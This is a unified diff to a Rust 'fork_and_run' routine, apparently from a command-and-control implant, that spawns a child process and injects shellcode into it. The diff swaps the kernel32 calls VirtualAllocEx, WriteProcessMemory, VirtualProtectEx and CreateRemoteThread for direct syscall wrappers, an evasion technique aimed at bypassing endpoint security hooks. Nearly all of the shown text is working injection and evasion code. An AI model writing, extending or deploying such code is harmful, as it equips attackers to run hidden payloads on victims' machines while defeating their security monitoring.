@@ -75,10 +75,6 @@ unsafe fn fork_and_run_impl(shellcode: &[u8], spawnto: &str, timeout_ms: u32) ->
 
     type CreatePipeFn = unsafe extern "system" fn(*mut *mut c_void, *mut *mut c_void, *mut SecurityAttributes, u32) -> i32;
     type CreateProcessAFn = unsafe extern "system" fn(*const u8, *mut u8, *mut c_void, *mut c_void, i32, u32, *mut c_void, *const u8, *mut StartupInfoA, *mut ProcessInformation) -> i32;
-    type VirtualAllocExFn = unsafe extern "system" fn(*mut c_void, *mut c_void, usize, u32, u32) -> *mut c_void;
-    type WriteProcessMemoryFn = unsafe extern "system" fn(*mut c_void, *mut c_void, *const u8, usize, *mut usize) -> i32;
-    type VirtualProtectExFn = unsafe extern "system" fn(*mut c_void, *mut c_void, usize, u32, *mut u32) -> i32;
-    type CreateRemoteThreadFn = unsafe extern "system" fn(*mut c_void, *mut c_void, usize, Option<unsafe extern "system" fn(*mut c_void) -> u32>, *mut c_void, u32, *mut u32) -> *mut c_void;
     type ResumeThreadFn = unsafe extern "system" fn(*mut c_void) -> u32;
     type ReadFileFn = unsafe extern "system" fn(*mut c_void, *mut u8, u32, *mut u32, *mut c_void) -> i32;
     type WaitForSingleObjectFn = unsafe extern "system" fn(*mut c_void, u32) -> u32;
@@ -123,10 +119,6 @@ unsafe fn fork_and_run_impl(shellcode: &[u8], spawnto: &str, timeout_ms: u32) ->
     // Resolve APIs
     let create_pipe: CreatePipeFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "CreatePipe").ok_or("CreatePipe")?);
     let create_process: CreateProcessAFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "CreateProcessA").ok_or("CreateProcessA")?);
-    let virtual_alloc_ex: VirtualAllocExFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "VirtualAllocEx").ok_or("VirtualAllocEx")?);
-    let write_process_memory: WriteProcessMemoryFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "WriteProcessMemory").ok_or("WriteProcessMemory")?);
-    let virtual_protect_ex: VirtualProtectExFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "VirtualProtectEx").ok_or("VirtualProtectEx")?);
-    let create_remote_thread: CreateRemoteThreadFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "CreateRemoteThread").ok_or("CreateRemoteThread")?);
     let resume_thread: ResumeThreadFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "ResumeThread").ok_or("ResumeThread")?);
     let read_file: ReadFileFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "ReadFile").ok_or("ReadFile")?);
     let wait_for_single_object: WaitForSingleObjectFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "WaitForSingleObject").ok_or("WaitForSingleObject")?);
@@ -174,33 +166,18 @@ unsafe fn fork_and_run_impl(shellcode: &[u8], spawnto: &str, timeout_ms: u32) ->
     }
 
     // 3. Allocate + write + protect in child
-    let remote_mem = virtual_alloc_ex(pi.process, ptr::null_mut(), shellcode.len(), 0x3000, 0x04); // MEM_COMMIT|RESERVE, PAGE_READWRITE
-    if remote_mem.is_null() {
-        terminate_process(pi.process, 1);
-        close_handle(pi.process);
-        close_handle(pi.thread);
-        close_handle(read_pipe);
-        close_handle(write_pipe);
-        return Err("VirtualAllocEx failed in child".to_string());
-    }
+    let remote_mem = crate::syscalls::nt_alloc_remote(pi.process, shellcode.len(), 0x04)
+        .map_err(|e| e)?;
 
-    let mut written: usize = 0;
-    write_process_memory(pi.process, remote_mem, shellcode.as_ptr(), shellcode.len(), &mut written);
+    crate::syscalls::nt_write_memory(pi.process, remote_mem, shellcode)
+        .map_err(|e| e)?;
 
-    let mut old_protect: u32 = 0;
-    virtual_protect_ex(pi.process, remote_mem, shellcode.len(), 0x20, &mut old_protect); // PAGE_EXECUTE_READ
+    crate::syscalls::nt_protect_remote(pi.process, remote_mem, shellcode.len(), 0x20)
+        .map_err(|e| e)?;
 
     // 4. Create remote thread in child to execute shellcode + close write pipe
-    let mut remote_tid: u32 = 0;
-    let remote_thread = create_remote_thread(
-        pi.process,
-        ptr::null_mut(),
-        0,
-        Some(std::mem::transmute(remote_mem)),
-        ptr::null_mut(),
-        0,
-        &mut remote_tid,
-    );
+    let remote_thread = crate::syscalls::nt_create_thread(pi.process, remote_mem)
+        .map_err(|e| e)?;
 
     // Resume the main thread (needed for process to initialize)
     resume_thread(pi.thread);
